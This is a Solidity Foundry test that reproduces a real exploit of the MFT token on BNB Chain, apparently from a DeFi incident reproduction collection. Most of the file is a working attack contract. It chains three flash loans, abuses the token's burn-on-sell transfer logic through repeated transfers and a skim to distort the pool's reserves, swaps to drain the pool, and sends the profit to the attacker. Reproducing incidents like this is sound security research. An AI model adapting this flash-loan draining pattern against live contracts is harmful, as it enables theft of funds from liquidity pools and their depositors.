// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 33.7k USD
// Attacker : https://bscscan.com/address/0x2bee9915ddefdc987a42275fbcc39ed178a70aaa
// Attack Contract : https://bscscan.com/address/0x6E088C3dD1055F5dD1660C1c64dE2af8110B85a8
// Vulnerable Contract : https://bscscan.com/address/0x29Ee4526e3A4078Ce37762Dc864424A089Ebba11
// Attack Tx : https://bscscan.com/tx/0xe24ee2af7ceee6d6fad1cacda26004adfe0f44d397a17d2aca56c9a01d759142

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x29Ee4526e3A4078Ce37762Dc864424A089Ebba11#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1858351609371406617
// Hacking God : N/A
pragma solidity ^0.8.0;

// pancake USDT / WBNB pool
address constant USDT_WBNB_POOL_001 = 0x172fcD41E0913e95784454622d1c3724f546f849;
// pancake USDT / USDC pool
address constant USDT_USDC_POOL = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
// pancake USDT / WBNB pool
address constant USDT_WBNB_POOL_005 = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
address constant BSC_USD = 0x55d398326f99059fF775485246999027B3197955;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant CAKE_LP = 0x67C88f71da4Ef48Ad4bEa9000264c9a17Ef2a7Aa;
address constant MFT_TOKEN = 0x29Ee4526e3A4078Ce37762Dc864424A089Ebba11;
address constant PLEDGE_ADDR = 0xCa9dA4C9CA17951893bAdA3574160d36Ac6735B9;
address constant MSF_EXPLOITER = 0x2BeE9915DDEFDC987A42275fbcC39ed178A70aAA;

contract MFT is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 44097964 - 1;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = BSC_USD;
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        AttackContract attackContract = new AttackContract();

        vm.prank(MSF_EXPLOITER);
        IERC20(MFT_TOKEN).approve(address(attackContract), type(uint256).max);

        // Step 0
        attackContract.transfer2(MFT_TOKEN, 14_000_000);
    }
}

contract AttackContract {
    address[] pools = [USDT_WBNB_POOL_001, USDT_USDC_POOL, USDT_WBNB_POOL_005];

    // store flash loan fees
    uint256[] fees = [0, 0, 0];

    // store flash loan amounts
    uint256[] borrowAmounts = [0, 0, 0];
    address public target;
    address public attacker;
    constructor() {
        attacker = msg.sender;
    }

    function transfer2(address to, uint256 amount) public {
        target = to;
        borrowAmounts[2] = amount * 1e18;

        // Step 1: Borrow BSC from USDT_WBNB_POOL_001
        borrow(1);
    }

    function borrow(uint256 num) internal {
        address pool = pools[num-1];
        uint256 borrowAmount = borrowAmounts[num-1];
        if (borrowAmount == 0) {
            borrowAmount = IERC20(BSC_USD).balanceOf(pool);
            borrowAmounts[num-1] = borrowAmount;
        }
        bytes memory data = abi.encode(uint256(num));
        IPancakeV3Pool(pool).flash(address(this), borrowAmount, 0, data);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) public {
        uint256 num = abi.decode(data, (uint256));
        fees[num-1] = fee0;
        if (num < pools.length) {
            // Step 2: Borrow BSC from USDT_USDC_POOL
            // Step 3: Borrow BSC from USDT_WBNB_POOL_005
            borrow(num + 1);

            if (num == 1) {
                // Step 10: Pay flash load 0
                IERC20 bsc = IERC20(BSC_USD);
                bsc.transfer(pools[0], borrowAmounts[0] + fees[0]);
                // Step 11: Send rest BSC to attacker
                bsc.transfer(attacker, bsc.balanceOf(address(this)));
            }
        } else {
            // Step 4: Attack MFT
            realAttack();
        }
        
    }

    function realAttack() public {
        IERC20 bsc = IERC20(BSC_USD);
        IERC20 mft = IERC20(MFT_TOKEN);
        bsc.approve(PANCAKE_ROUTER, type(uint256).max);
        mft.approve(PANCAKE_ROUTER, type(uint256).max);

        // 0x2c8ad95cf1f85715abbe9d60c29826c82396a1ac.transferFrom()

        // Root cause: MFT.transfer() will burn token from the pool when user trys to sell token.
        // Step 5: makes a few transfers to the pair to trigger the sell in the MFT transfer()
        for (uint256 i = 0; i < 5; i++) {
            uint256 mftBalance = mft.balanceOf(MFT_TOKEN);
            mft.transferFrom(MSF_EXPLOITER, CAKE_LP, mftBalance);
        }

        IPancakePair cakeLp = IPancakePair(CAKE_LP);
        cakeLp.skim(PLEDGE_ADDR);

        // Step 6: buy a large amount of MFT, making the MFT balance of the pair low
        uint256 bscBalance = bsc.balanceOf(address(this));
        address[] memory BSC_MFT_PATH = new address[](2);
        BSC_MFT_PATH[0] = BSC_USD;
        BSC_MFT_PATH[1] = MFT_TOKEN;
        IPancakeRouter(payable(PANCAKE_ROUTER)).swapExactTokensForTokensSupportingFeeOnTransferTokens(bscBalance, 0, BSC_MFT_PATH, PLEDGE_ADDR, block.timestamp);

        uint256 lpMftBalance = mft.balanceOf(CAKE_LP);
        mft.transferFrom(MSF_EXPLOITER, CAKE_LP, lpMftBalance - 1 wei);

        address[] memory MFT_BSC_PATH = new address[](2);
        MFT_BSC_PATH[0] = MFT_TOKEN;
        MFT_BSC_PATH[1] = BSC_USD;
        lpMftBalance = mft.balanceOf(CAKE_LP);

        (uint256 reserve0, uint256 reserve1, uint256 _blockTimestampLast) = IPancakePair(CAKE_LP).getReserves();
        uint256 amounttIn = lpMftBalance - reserve0;
        uint256[] memory amounts = IPancakeRouter(payable(PANCAKE_ROUTER)).getAmountsOut(amounttIn, MFT_BSC_PATH);

        // Step 7: selling an equal amount of MFT again,  and due to burn meachanism, the pool is drained.
        IPancakePair(CAKE_LP).swap(0, amounts[1], address(this), "");

        // Step 8: Pay flash load 1
        bsc.transfer(pools[1], borrowAmounts[1] + fees[1]);
        // Step 9: Pay flash load 2
        bsc.transfer(pools[2], borrowAmounts[2] + fees[2]);
    }
}
